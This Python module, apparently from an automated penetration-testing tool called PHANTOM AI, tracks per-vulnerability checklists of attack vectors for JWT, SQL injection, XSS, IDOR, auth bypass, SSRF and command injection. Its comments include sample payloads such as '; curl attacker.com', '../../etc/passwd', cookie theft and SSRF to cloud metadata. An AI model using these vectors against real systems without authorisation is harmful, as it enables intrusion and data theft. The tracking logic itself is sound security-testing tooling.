"""
PHANTOM AI - Exhaustion Tracker

Philosophy: "Done = impacto total provado OU vetores esgotados. Não antes."

Per-finding exhaustion tracking ensures we don't move on from a vulnerability
until we've tried all relevant attack vectors.

This implements GAP-B: Proper "done" criteria for each finding.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

from utils.logger import get_logger

logger = get_logger(__name__)


@dataclass
class VectorAttempt:
    """Record of a single vector attempt."""
    vector: str
    succeeded: bool
    payload: str = ""
    response_indicator: str = ""
    notes: str = ""


@dataclass
class FindingExhaustion:
    """
    Exhaustion state for a single finding.

    Tracks all vectors tried, succeeded, and remaining for a finding.
    Only marks as "done" when checklist is complete.
    """
    finding_id: str
    finding_type: str
    endpoint: str

    # Exhaustion state
    vectors_required: list[str] = field(default_factory=list)
    vectors_tried: list[str] = field(default_factory=list)
    vectors_succeeded: list[str] = field(default_factory=list)
    attempts: list[VectorAttempt] = field(default_factory=list)

    # Status
    is_exhausted: bool = False
    exhaustion_reason: str = ""

    # Impact
    max_impact_achieved: str = "NONE"  # NONE, PARTIAL, FULL
    impact_evidence: list[str] = field(default_factory=list)

    def record_attempt(
        self,
        vector: str,
        succeeded: bool,
        payload: str = "",
        notes: str = "",
    ) -> None:
        """Record an attempt at a vector."""
        attempt = VectorAttempt(
            vector=vector,
            succeeded=succeeded,
            payload=payload,
            notes=notes,
        )
        self.attempts.append(attempt)

        if vector not in self.vectors_tried:
            self.vectors_tried.append(vector)

        if succeeded and vector not in self.vectors_succeeded:
            self.vectors_succeeded.append(vector)

        # Remove from required
        if vector in self.vectors_required:
            self.vectors_required.remove(vector)

        # Check exhaustion
        if not self.vectors_required:
            self.is_exhausted = True
            self.exhaustion_reason = "all_vectors_tried"

    def force_exhaust(self, reason: str) -> None:
        """Force exhaustion (e.g., budget exceeded)."""
        self.is_exhausted = True
        self.exhaustion_reason = reason

    @property
    def progress(self) -> float:
        """Percentage complete."""
        total = len(self.vectors_tried) + len(self.vectors_required)
        if total == 0:
            return 100.0
        return (len(self.vectors_tried) / total) * 100

    @property
    def success_rate(self) -> float:
        """Percentage of tried vectors that succeeded."""
        if not self.vectors_tried:
            return 0.0
        return (len(self.vectors_succeeded) / len(self.vectors_tried)) * 100


class ExhaustionTracker:
    """
    Per-finding exhaustion tracking.

    Each finding type has a checklist of vectors that MUST be tested
    before the finding is considered "done".

    Features:
    1. Per-finding vector checklists
    2. Progress tracking
    3. Impact escalation tracking
    4. "Done" criteria enforcement
    """

    # Exhaustion checklists per finding type
    EXHAUSTION_CHECKLISTS: dict[str, list[str]] = {
        # JWT attacks
        "jwt": [
            "alg_none",              # Set alg to "none"
            "alg_hs256_rsa",         # RS256 → HS256 confusion
            "kid_injection",         # Key ID injection
            "kid_path_traversal",    # kid: ../../etc/passwd
            "jku_spoofing",          # JKU header to attacker server
            "x5u_spoofing",          # X5U header manipulation
            "x5c_injection",         # Embed certificate in token
            "expired_clock_skew",    # Use expired token with clock tolerance
            "not_before_bypass",     # Bypass nbf claim
            "cross_audience",        # Wrong aud claim
            "cross_issuer",          # Wrong iss claim
            "role_escalation",       # Modify role claim
            "admin_claim",           # Add admin: true
            "user_id_swap",          # Change sub claim
            "token_replay",          # Replay after logout
            "token_refresh_abuse",   # Abuse refresh mechanism
            "signature_strip",       # Remove signature entirely
            "weak_secret_crack",     # Dictionary attack on secret
        ],

        # SQLi attacks
        "sqli": [
            "union_column_count",    # Determine column count
            "union_data_extract",    # Extract via UNION
            "error_based",           # Extract via errors
            "blind_boolean",         # Boolean-based blind
            "blind_time_based",      # Time-based blind
            "stacked_queries",       # Multiple statements
            "second_order",          # Stored payload
            "file_read",             # Read files
            "file_write",            # Write files
            "rce_udf",               # UDF-based RCE
            "rce_copy",              # COPY-based RCE (Postgres)
            "db_version",            # Extract version
            "db_user",               # Extract current user
            "db_tables",             # List tables
            "db_dump",               # Dump data
        ],
        "sql_injection": [],  # Alias, populated at runtime

        # XSS attacks
        "xss": [
            "script_tag",            # <script>alert(1)</script>
            "img_onerror",           # <img onerror=...>
            "svg_onload",            # <svg onload=...>
            "body_onload",           # <body onload=...>
            "input_onfocus",         # <input onfocus=... autofocus>
            "iframe_srcdoc",         # <iframe srcdoc=...>
            "javascript_uri",        # javascript:...
            "data_uri",              # data:text/html,...
            "template_injection",    # {{constructor.constructor('alert(1)')()}}
            "dom_manipulation",      # DOM-based XSS
            "mutation_xss",          # mXSS via innerHTML
            "cookie_access",         # document.cookie extraction
            "keylogger",             # Event listener injection
            "stored_check",          # Verify persistence
            "csp_bypass",            # CSP bypass attempts
        ],
        "dom_xss": [],  # Alias

        # IDOR attacks
        "idor": [
            "sequential_5_ids",      # Test 5 sequential IDs
            "sequential_10_ids",     # Test 10 sequential IDs
            "admin_ids",             # Test 0, 1, admin
            "negative_ids",          # Test -1, -999
            "max_int",               # Test MAX_INT, MAX_INT+1
            "uuid_v1_time",          # UUID v1 timestamp prediction
            "base64_decode",         # Decode base64 IDs
            "hex_decode",            # Decode hex IDs
            "method_get_to_put",     # GET → PUT escalation
            "method_get_to_delete",  # GET → DELETE escalation
            "method_get_to_patch",   # GET → PATCH escalation
            "param_pollution",       # id=1&id=2
            "array_injection",       # id[]=1&id[]=2
            "wildcard",              # id=*
            "null_id",               # id=null
        ],
        "authorization": [],  # Alias

        # Auth bypass attacks
        "auth_bypass": [
            "path_case_upper",       # /Admin
            "path_case_lower",       # /ADMIN
            "path_double_slash",     # //admin
            "path_dot_segment",      # /admin/../admin
            "path_trailing_slash",   # /admin/
            "path_semicolon",        # /admin;
            "path_null_byte",        # /admin%00
            "path_extension",        # /admin.json
            "path_unicode",          # Unicode normalization
            "header_xff",            # X-Forwarded-For
            "header_x_original_url", # X-Original-URL
            "header_x_rewrite_url",  # X-Rewrite-URL
            "method_override",       # X-HTTP-Method-Override
            "verb_get_to_post",      # GET → POST
            "verb_head",             # HEAD request
            "param_debug",           # debug=true
            "param_admin",           # admin=true
        ],
        "authentication_bypass": [],  # Alias

        # Session abuse attacks
        "session_abuse": [
            "session_fixation",      # Pre-set session ID
            "session_prediction",    # Predict session ID
            "concurrent_login",      # Multiple sessions
            "session_timeout",       # Session lives too long
            "logout_no_invalidate",  # Token valid after logout
            "cookie_secure_flag",    # Missing Secure flag
            "cookie_httponly_flag",  # Missing HttpOnly flag
            "cookie_samesite",       # Missing SameSite
            "cookie_domain_scope",   # Too broad domain
            "token_leakage_referer", # Token in Referer
            "token_leakage_log",     # Token in logs/errors
        ],

        # Business logic attacks
        "business_logic": [
            "negative_quantity",     # qty=-1
            "zero_quantity",         # qty=0
            "negative_price",        # price=-100
            "zero_price",            # price=0
            "max_int_quantity",      # qty=2147483647
            "decimal_abuse",         # qty=0.0001
            "currency_mismatch",     # price in different currency
            "workflow_skip",         # Skip payment step
            "workflow_repeat",       # Repeat bonus step
            "race_quantity",         # Race on limited stock
            "race_coupon",           # Race on single-use coupon
            "race_transfer",         # Race on balance transfer
            "time_manipulation",     # Expired offer still valid
        ],

        # Command injection
        "cmdi": [
            "semicolon",             # ;id
            "pipe",                  # |id
            "backticks",             # `id`
            "dollar_parens",         # $(id)
            "newline",               # \nid
            "and_operator",          # && id
            "or_operator",           # || id
            "redirection",           # > /tmp/out
            "time_based",            # ; sleep 5
            "oob_dns",               # ; nslookup attacker.com
            "oob_http",              # ; curl attacker.com
        ],
        "command_injection": [],  # Alias

        # SSRF attacks
        "ssrf": [
            "localhost_127",         # 127.0.0.1
            "localhost_short",       # 127.1
            "localhost_ipv6",        # [::1]
            "localhost_decimal",     # 2130706433 (decimal IP)
            "localhost_hex",         # 0x7f000001
            "localhost_octal",       # 0177.0.0.1
            "internal_ranges",       # 10.x, 172.x, 192.168.x
            "cloud_metadata",        # 169.254.169.254
            "dns_rebinding",         # Rebinding attack
            "protocol_file",         # file:///etc/passwd
            "protocol_gopher",       # gopher://
            "protocol_dict",         # dict://
            "url_bypass_at",         # http://evil@good.com
            "url_bypass_hash",       # http://good.com#evil
        ],
    }

    def __init__(self) -> None:
        # Active exhaustion states keyed by finding_id
        self._findings: dict[str, FindingExhaustion] = {}

        # Statistics
        self._total_vectors_tried = 0
        self._total_vectors_succeeded = 0

        # Set up aliases
        self.EXHAUSTION_CHECKLISTS["sql_injection"] = self.EXHAUSTION_CHECKLISTS["sqli"]
        self.EXHAUSTION_CHECKLISTS["dom_xss"] = self.EXHAUSTION_CHECKLISTS["xss"]
        self.EXHAUSTION_CHECKLISTS["authorization"] = self.EXHAUSTION_CHECKLISTS["idor"]
        self.EXHAUSTION_CHECKLISTS["authentication_bypass"] = self.EXHAUSTION_CHECKLISTS["auth_bypass"]
        self.EXHAUSTION_CHECKLISTS["command_injection"] = self.EXHAUSTION_CHECKLISTS["cmdi"]

        logger.debug("[EXHAUSTION] ExhaustionTracker initialized")

    def register_finding(self, finding: dict) -> str:
        """
        Register a finding for exhaustion tracking.

        Returns the finding_id for future reference.
        """
        finding_type = finding.get("vuln_type", finding.get("type", "unknown")).lower()
        endpoint = finding.get("matched_at", "") or finding.get("url", "")

        # Generate finding ID
        finding_id = f"{finding_type}:{hash(endpoint) % 10000}"

        # Get checklist for this type
        checklist = self.EXHAUSTION_CHECKLISTS.get(finding_type, []).copy()

        # Create exhaustion state
        exhaustion = FindingExhaustion(
            finding_id=finding_id,
            finding_type=finding_type,
            endpoint=endpoint,
            vectors_required=checklist,
        )

        self._findings[finding_id] = exhaustion

        logger.info(
            f"[EXHAUSTION] Registered finding {finding_id}: "
            f"{len(checklist)} vectors to exhaust"
        )

        return finding_id

    def record_attempt(
        self,
        finding_id: str,
        vector: str,
        succeeded: bool,
        payload: str = "",
        notes: str = "",
    ) -> None:
        """Record an attempt at a vector for a finding."""
        if finding_id not in self._findings:
            logger.warning(f"[EXHAUSTION] Unknown finding_id: {finding_id}")
            return

        exhaustion = self._findings[finding_id]
        exhaustion.record_attempt(vector, succeeded, payload, notes)

        self._total_vectors_tried += 1
        if succeeded:
            self._total_vectors_succeeded += 1

        logger.debug(
            f"[EXHAUSTION] {finding_id} vector '{vector}': "
            f"{'✅' if succeeded else '❌'} "
            f"(progress: {exhaustion.progress:.0f}%)"
        )

    def is_finding_exhausted(self, finding_id: str) -> bool:
        """Check if a finding has been exhausted."""
        if finding_id not in self._findings:
            return True  # Unknown = assume exhausted
        return self._findings[finding_id].is_exhausted

    def get_remaining_vectors(self, finding_id: str) -> list[str]:
        """Get vectors still to try for a finding."""
        if finding_id not in self._findings:
            return []
        return self._findings[finding_id].vectors_required.copy()

    def force_exhaust(self, finding_id: str, reason: str) -> None:
        """Force a finding to be marked as exhausted."""
        if finding_id in self._findings:
            self._findings[finding_id].force_exhaust(reason)
            logger.info(f"[EXHAUSTION] Force exhausted {finding_id}: {reason}")

    def get_exhaustion_summary(self, finding_id: str) -> dict[str, Any]:
        """Get exhaustion summary for a finding."""
        if finding_id not in self._findings:
            return {"error": "Unknown finding"}

        e = self._findings[finding_id]
        return {
            "finding_id": e.finding_id,
            "finding_type": e.finding_type,
            "endpoint": e.endpoint,
            "is_exhausted": e.is_exhausted,
            "exhaustion_reason": e.exhaustion_reason,
            "progress": e.progress,
            "vectors_tried": len(e.vectors_tried),
            "vectors_succeeded": len(e.vectors_succeeded),
            "vectors_remaining": len(e.vectors_required),
            "success_rate": e.success_rate,
            "max_impact": e.max_impact_achieved,
        }

    def get_global_summary(self) -> dict[str, Any]:
        """Get global exhaustion statistics."""
        exhausted = sum(1 for f in self._findings.values() if f.is_exhausted)
        not_exhausted = len(self._findings) - exhausted

        return {
            "total_findings_tracked": len(self._findings),
            "findings_exhausted": exhausted,
            "findings_not_exhausted": not_exhausted,
            "total_vectors_tried": self._total_vectors_tried,
            "total_vectors_succeeded": self._total_vectors_succeeded,
            "global_success_rate": (
                (self._total_vectors_succeeded / self._total_vectors_tried * 100)
                if self._total_vectors_tried > 0 else 0
            ),
            "not_exhausted_findings": [
                self.get_exhaustion_summary(fid)
                for fid, f in self._findings.items()
                if not f.is_exhausted
            ],
        }

    def get_vectors_for_type(self, finding_type: str) -> list[str]:
        """Get the full exhaustion checklist for a finding type."""
        return self.EXHAUSTION_CHECKLISTS.get(finding_type.lower(), []).copy()


# Global instance
_exhaustion_tracker: ExhaustionTracker | None = None


def get_exhaustion_tracker() -> ExhaustionTracker:
    """Get the global exhaustion tracker instance."""
    global _exhaustion_tracker
    if _exhaustion_tracker is None:
        _exhaustion_tracker = ExhaustionTracker()
    return _exhaustion_tracker


def reset_exhaustion_tracker() -> ExhaustionTracker:
    """Reset and return a new exhaustion tracker."""
    global _exhaustion_tracker
    _exhaustion_tracker = ExhaustionTracker()
    return _exhaustion_tracker
